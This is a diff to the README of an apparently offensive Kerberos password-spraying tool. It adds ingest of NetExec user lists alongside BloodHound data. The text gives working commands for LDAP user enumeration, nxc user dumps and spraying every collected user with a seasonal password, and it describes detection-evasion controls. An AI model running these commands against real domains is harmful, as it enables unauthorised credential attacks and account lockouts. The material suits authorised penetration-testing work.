@@ -29,8 +29,12 @@ binary — with a set of quality-of-life features layered on top.
 * **LDAP & password-policy recon** — enumerate users (flagging
   disabled / SPN / no-pre-auth) and read the real lockout policy, fine-grained
   PSOs included.
-* **BloodHound ingest** — source your user list straight from a SharpHound
-  `users.json`, directory, or `.zip`.
+* **User ingest** — build your target user list from an offline source instead
+  of retyping it: **BloodHound** (a SharpHound `users.json`, directory, or
+  `.zip`) or **nxc / NetExec** (a `--users-export` file, or a tee'd/piped
+  `--users` / `--active-users` console capture). Ingested users are saved to the
+  per-realm state file, so a later spray can target them all with `@state` — no
+  list argument needed.
 * **OPSEC controls** — jitter, a global rate cap, order randomization,
   canary/honeypot avoidance, business-hours windows, and SOCKS5 routing.
 * **Structured reporting** — JSON / greppable / raw / hashcat-ready output
@@ -103,13 +107,33 @@ PSOs) over LDAP; `--check-badpwdcount` shrinks the first window. One-shot runs
 that would exceed the budget **auto-promote to a campaign** with an ETA, and the
 run **panic-stops** after `--panic-after` lockouts.
 
-### LDAP & BloodHound recon
+### LDAP recon & user ingest
 ```sh
-kerbrutez ldapenum -d corp.local --dc 10.0.0.10 --ldap-user joe --ldap-pass P   # flags DISABLED / SPN / NO-PREAUTH
-kerbrutez ldapenum -d corp.local --bloodhound ./sharphound.zip -o working_users.txt   # ingest directly from sharphound data
+kerbrutez ldapenum -d corp.local --dc 10.0.0.10 --ldap-user joe --ldap-pass P     # live LDAP: flags DISABLED / SPN / NO-PREAUTH
+kerbrutez ldapenum -d corp.local --bloodhound ./sharphound.zip -o working.txt     # offline: SharpHound users.json / dir / .zip
 ```
-BloodHound ingest accepts a `users.json`, a directory, or a SharpHound `.zip`,
-and is hardened against zip bombs and path traversal.
+Ingest a user list you already collected with **nxc / NetExec** — either the
+clean `--users-export` file, or a tee'd/piped capture of the `--users` /
+`--active-users` console output (kerbrutez strips the `PROTO IP PORT HOST`
+prefix, drops banner/credential/header lines, and de-duplicates):
+```sh
+# clean export file (one sAMAccountName per line)
+nxc smb  10.0.0.10 -u u -p p --users-export users.txt
+kerbrutez ldapenum -d corp.local --nxc users.txt
+
+# tee'd console (the ONLY way to get an active-only list: --active-users prints
+# active users to the console, but --users-export always writes ALL of them)
+nxc ldap 10.0.0.10 -u u -p p --active-users | tee active.txt
+kerbrutez ldapenum -d corp.local --nxc active.txt
+
+# or pipe the console straight in with '-'
+nxc smb 10.0.0.10 -u u -p p --users | kerbrutez ldapenum -d corp.local --nxc -
+```
+With `-d`, an ingest also saves the users to the per-realm state file, so you can
+spray them all later without a list argument:
+```sh
+kerbrutez spraycampaign -d corp.local --dc 10.0.0.10 @state 'Spring2026!'         # spray every ingested user
+```
 
 ### OPSEC controls
 `--noise 1|2|3` (stealthy→loud) sets sane defaults you can override:
